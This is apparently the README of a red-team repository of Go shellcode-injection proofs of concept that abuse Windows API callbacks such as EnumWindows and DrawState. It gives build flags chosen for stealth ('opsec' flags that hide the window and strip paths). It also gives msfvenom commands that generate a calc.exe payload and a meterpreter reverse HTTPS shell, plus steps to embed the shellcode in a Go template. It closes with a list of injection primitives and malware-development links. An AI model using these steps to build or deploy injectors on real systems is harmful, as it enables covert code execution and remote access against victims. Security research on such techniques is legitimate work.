# Golang-Injection-Techniques
## Disclaimer
This repository presents a collection of already well-documented injection primitives, adapted to Go. The PoCs are not meant to evade competent AVs out-of-the-box as they have been around for quite some time now, but could be combined along with other techniques.

## Build
```
GOOS=windows go build -o DrawState.exe callbacks/DrawStateW.go

# Additional flags for opsec considerations
-ldflags -H=windowsgui  (do not pop any window)
-trimpath               (remove local path from final PE)
-ldflags="-s -w"        (shrink executable)
```
## Payload generation
The `hex` output of msfvenom was used as there was no golang buffer formatting
```
msfvenom --platform windows -a x64  -p windows/x64/exec CMD=calc.exe -f hex -o calc.hex
```
However these few lines allow to format manually 
```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=127.0.0.1 LPORT=443 -f raw -o meterpreter.bin
cat meterpreter.bin | xxd -p | sed 's/.\{2\}/0x&, /g' > meterpreter.gohex

# Then in the template
var shellcode = []byte{
  // insert formatted shellcode here
}
```



## Callback injection primitives
The following callback injection primitives have been pushed.
```
- DrawState
- EnumChildWindows
- EnumDisplayMonitors
- EnumDateFormats
- EnumDesktops
- GrayString
- EnumFonts
- LineDDA              
- EnumFontFamilies
- CallWindowProc
- EnumTimeFormats
- EnumWindows
- EnumDesktopWindows
- EnumThreadWindows
- EnumSystemLocales
- EnumSystemGeoID
```

## Untested callback injection primitives 
```
- EnumSystemLanguageGroups
- EnumUILanguages
- EnumSystemCodePages
```
Many more are presented in the pentester's promiscuous notebook ([https://ppn.snovvcrash.rocks/red-team/maldev/code-injection](https://ppn.snovvcrash.rocks/red-team/maldev/code-injection))


### References
- [http://ropgadget.com/posts/abusing_win_functions.html](http://ropgadget.com/posts/abusing_win_functions.html)
- [https://github.com/Ne0nd0g/go-shellcode](https://github.com/Ne0nd0g/go-shellcode)
- [https://github.com/aahmad097/AlternativeShellcodeExec](https://github.com/aahmad097/AlternativeShellcodeExec)
- [https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection](https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection)
- [https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/](https://osandamalith.com/2021/04/01/executing-shellcode-via-callbacks/)

### Relevant resources
- [https://www.pinvoke.net](https://www.pinvoke.net)
- [https://ppn.snovvcrash.rocks/red-team/maldev/code-injection](https://ppn.snovvcrash.rocks/red-team/maldev/code-injection)
